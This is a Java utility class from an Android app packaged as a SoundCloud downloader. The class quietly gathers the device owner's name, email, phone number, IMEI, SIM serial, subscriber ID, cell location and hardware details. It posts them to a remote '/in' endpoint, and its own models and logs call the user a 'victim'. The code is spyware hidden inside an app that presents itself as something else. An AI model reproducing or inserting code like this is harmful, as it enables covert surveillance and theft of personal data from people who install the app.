package com.theah64.soundclouddownloader.utils;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.support.annotation.NonNull;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.NeighboringCellInfo;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.theah64.xrob.models.Victim;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * All the auth needed API request must be passed through this gate way.
 * Created by theapache64 on 12/9/16.
 */
public class APIRequestGateway {

    private static final String KEY_API_KEY = "api_key";

    private static final String X = APIRequestGateway.class.getSimpleName();
    private final Activity activity;
    private TelephonyManager tm;

    private static String getDeviceName() {
        final String manufacturer = Build.MANUFACTURER;
        final String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model.toUpperCase();
        } else {
            return manufacturer.toUpperCase() + " " + model;
        }
    }


    public static class DeviceInfoBuilder {

        private static final String HOT_REGEX = "[,=]";
        public StringBuilder stringBuilder = new StringBuilder();

        public DeviceInfoBuilder put(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value)).append(",");
            return this;
        }

        public DeviceInfoBuilder put(final String key, final int value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final long value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final boolean value) {
            return put(key, String.valueOf(value));
        }

        private static String getCooledValue(String value) {
            if (value == null || value.isEmpty()) {
                return "-";
            }
            return value.replaceAll(HOT_REGEX, "~");
        }

        public DeviceInfoBuilder putLastInfo(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value));
            return this;
        }

        @Override
        public String toString() {
            return stringBuilder.toString();
        }


    }

    private String getDeviceInfoDynamic() {
        final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();

        //NOT NEEDED FOR NOW.
       /*
       int i = 0;
        if (CommonUtils.isSupport(17)) {
            for (final CellInfo cellInfo : tm.getAllCellInfo()) {
                i++;

                deviceInfoBuilder.put(i + " CellInfo timeStamp", cellInfo.getTimeStamp());
                deviceInfoBuilder.put(i + " CellInfo isRegistered", cellInfo.isRegistered());

                if (cellInfo instanceof CellInfoCdma) {
                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoCdma) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoCdma) cellInfo).getCellIdentity().toString());
                } else if (cellInfo instanceof CellInfoGsm) {
                    deviceInfoBuilder.put(i + " CellInfoGsm Signal strength", ((CellInfoGsm) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoGsm CellIdentity", ((CellInfoGsm) cellInfo).getCellIdentity().toString());
                } else if (cellInfo instanceof CellInfoWcdma) {
                    deviceInfoBuilder.put(i + " CellInfoWcdma Signal strength", ((CellInfoWcdma) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoWcdma CellIdentity", ((CellInfoWcdma) cellInfo).getCellIdentity().toString());
                } else if (cellInfo instanceof CellInfoLte) {
                    deviceInfoBuilder.put(i + " CellInfoLte Signal strength", ((CellInfoLte) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoLte CellIdentity", ((CellInfoLte) cellInfo).getCellIdentity().toString());
                } else {
                    deviceInfoBuilder.put(i + "CellInfo class", cellInfo.getClass().getName());
                    deviceInfoBuilder.put(i + "CellInfo toString", cellInfo.toString());
                }
            }
        } else {
            for (final NeighboringCellInfo cellInfo : tm.getNeighboringCellInfo()) {
                i++;
                deviceInfoBuilder.put(i + " celInfo", cellInfo.toString());
            }
        }*/

        deviceInfoBuilder.put("NetworkCountryISO", tm.getNetworkCountryIso())
                .put("NetworkOperator", tm.getNetworkOperator())
                .put("NetworkOperatorName", tm.getNetworkOperatorName())
                .put("NetworkType", getNetworkType(tm.getNetworkType()));

        if (CommonUtils.isSupport(23)) {
            deviceInfoBuilder.put("PhoneCount", tm.getPhoneCount());
        }

        deviceInfoBuilder.put("PhoneType", getPhoneType(tm.getPhoneType()));
        deviceInfoBuilder.put("SIMCountryISO", tm.getSimCountryIso());
        deviceInfoBuilder.put("SIMOperator", tm.getSimOperator());
        deviceInfoBuilder.put("SIMOperatorName", tm.getSimOperatorName());
        deviceInfoBuilder.put("SIMSerialNumber", tm.getSimSerialNumber());

        //TODO: can be elaborate later.
        deviceInfoBuilder.put("SIM State", tm.getSimState());

        deviceInfoBuilder.put("SubscriberID", tm.getSubscriberId());
        deviceInfoBuilder.put("VoiceMailAlphaTag", tm.getVoiceMailAlphaTag());
        deviceInfoBuilder.put("VoiceMailNumber", tm.getVoiceMailNumber());

        //Collecting cell location
        final GsmCellLocation gcmCellLoc = (GsmCellLocation) tm.getCellLocation();
        if (gcmCellLoc != null) {
            deviceInfoBuilder.put("CID", gcmCellLoc.getCid())
                    .put("LAC", gcmCellLoc.getLac())
                    .put("PSC", gcmCellLoc.getPsc());
        }


        if (CommonUtils.isSupport(24)) {
            deviceInfoBuilder.put("DataNetworkType", getNetworkType(tm.getDataNetworkType()));
        }

        if (CommonUtils.isSupport(19)) {
            deviceInfoBuilder.put("MMSUAProfileUrl", tm.getMmsUAProfUrl());
            deviceInfoBuilder.put("MMSUserAgent", tm.getMmsUserAgent());
        }

        //Collecting sim card details
        deviceInfoBuilder.put("DeviceId", tm.getDeviceId())
                .put("Line1Number", tm.getLine1Number())
                .putLastInfo("SoftwareVersion", tm.getDeviceSoftwareVersion());

        if (tm.getCellLocation() != null) {
            deviceInfoBuilder.put("CellLocation", tm.getCellLocation().toString());
        }

        return deviceInfoBuilder.toString();
    }

    private String getDeviceInfoStatic() {

        final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();

        //Collecting device details
        deviceInfoBuilder
                .put("Build.BOARD", Build.BOARD)
                .put("Build.BOOTLOADER", Build.BOOTLOADER)
                .put("Build.BRAND", Build.BRAND)
                .put("Build.DEVICE", Build.DEVICE)
                .put("Build.FINGERPRINT", Build.FINGERPRINT)
                .put("Build.DISPLAY", Build.DISPLAY)
                .put("Build.HARDWARE", Build.HARDWARE)
                .put("Build.HOST", Build.HOST)
                .put("Build.ID", Build.ID)
                .put("Build.PRODUCT", Build.PRODUCT)
                .put("Build.SERIAL", Build.SERIAL);


        if (CommonUtils.isSupport(14)) {
            deviceInfoBuilder.putLastInfo("Build.getRadioVersion()", Build.getRadioVersion());
        } else {
            //noinspection deprecation
            deviceInfoBuilder.putLastInfo("Build.RADIO", Build.RADIO);
        }

        return deviceInfoBuilder.toString();
    }

    private static String getPhoneType(int phoneType) {
        switch (phoneType) {
            case TelephonyManager.PHONE_TYPE_NONE:
                return "TYPE_NONE";
            case TelephonyManager.PHONE_TYPE_GSM:
                return "TYPE_GSM";
            case TelephonyManager.PHONE_TYPE_CDMA:
                return "TYPE_CDMA";
            case TelephonyManager.PHONE_TYPE_SIP:
                return "TYPE_SIP";
            default:
                return "TYPE_VERY_NONE";
        }
    }

    private static String getNetworkType(int dataNetworkType) {
        switch (dataNetworkType) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return "TYPE_GPRS";
            case TelephonyManager.NETWORK_TYPE_EDGE:
                return "TYPE_EDGE";
            case TelephonyManager.NETWORK_TYPE_UMTS:
                return "TYPE_UMTS";
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                return "TYPE_HSDPA";
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                return "TYPE_HSUPA";
            case TelephonyManager.NETWORK_TYPE_HSPA:
                return "HSPA";
            case TelephonyManager.NETWORK_TYPE_CDMA:
                return "TYPE_CDMA";
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                return "TYPE_EVDO_0";
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                return "TYPE_EVDO_A";
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
                return "TYPE_EVDO_B";
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                return "TYPE_1xRTT";
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return "TYPE_IDEN";
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "TYPE_LTE";
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                return "TYPE_EHRPD";
            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
                return "TYPE_UNKNOWN";
            default:
                return "TYPE_VERY_UNKNOWN";
        }
    }

    public interface APIRequestGatewayCallback {
        void onReadyToRequest(final String apiKey);

        void onFailed(final String reason);
    }

    private final Context context;
    @NonNull
    private final APIRequestGatewayCallback callback;

    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
        this.context = context;
        this.activity = activity;
        this.callback = callback;
        execute();
    }

    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
        this(activity.getBaseContext(), activity, callback);
    }

    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
        this(context, null, callback);
    }


    private void register(final Context context) {

        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();

        final String imei = tm.getDeviceId();
        final String deviceName = getDeviceName();
        final String deviceHash = DarKnight.getEncrypted(deviceName + imei);

        final String email = profileUtils.getPrimaryEmail();
        final String phone = profileUtils.getPhone();
        final PrefUtils prefUtils = PrefUtils.getInstance(context);

        String fcmId = FirebaseInstanceId.getInstance().getToken();

        if (fcmId == null) {
            Log.d(X, "Live token is null, collecting from pref");
            fcmId = prefUtils.getString(PrefUtils.KEY_FCM_ID);
        }

        //Attaching them with the request
        final Request inRequest = new APIRequestBuilder("/in")
                .addParamIfNotNull(Victim.KEY_NAME, name)
                .addParam(Victim.KEY_IMEI, imei)
                .addParam(Victim.KEY_DEVICE_NAME, deviceName)
                .addParam(Victim.KEY_DEVICE_HASH, deviceHash)
                .addParam(Victim.KEY_DEVICE_INFO_STATIC, getDeviceInfoStatic())
                .addParam(Victim.KEY_DEVICE_INFO_DYNAMIC, getDeviceInfoDynamic())
                .addParamIfNotNull(Victim.KEY_THE_FCM_ID, fcmId)
                .addParamIfNotNull(Victim.KEY_EMAIL, email)
                .addParamIfNotNull(Victim.KEY_PHONE, phone)
                .build();

        //Doing API request
        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {

            @Override
            public void onFailure(Call call, final IOException e) {
                e.printStackTrace();
                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onFailed(e.getMessage());
                        }
                    });
                } else {
                    callback.onFailed(e.getMessage());
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {

                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                    final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);

                    //Saving in preference
                    final SharedPreferences.Editor editor = prefUtils.getEditor();
                    editor.putString(KEY_API_KEY, apiKey).commit();

                    if (activity != null) {

                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onReadyToRequest(apiKey);
                            }
                        });

                    } else {
                        callback.onReadyToRequest(apiKey);
                    }
                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();
                    if (activity != null) {
                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onFailed(e.getMessage());
                            }
                        });
                    } else {
                        callback.onFailed(e.getMessage());
                    }
                }
            }
        });

    }

    private void execute() {

        Log.d(X, "Opening gateway...");

        if (NetworkUtils.hasNetwork(context)) {

            Log.i(X, "Has network");

            final PrefUtils prefUtils = PrefUtils.getInstance(context);
            final String apiKey = prefUtils.getString(KEY_API_KEY);

            if (apiKey != null) {

                Log.d(X, "hasApiKey " + apiKey);

                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onReadyToRequest(apiKey);
                        }
                    });
                } else {
                    callback.onReadyToRequest(apiKey);
                }

            } else {

                Log.i(X, "Registering victim...");

                //Register victim here
                register(context);
            }

        } else {

            if (activity != null) {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        callback.onFailed("No network!");
                    }
                });
            } else {
                callback.onFailed("No network!");
            }

            Log.e(X, "Doesn't have APIKEY and no network!");

        }
    }
}
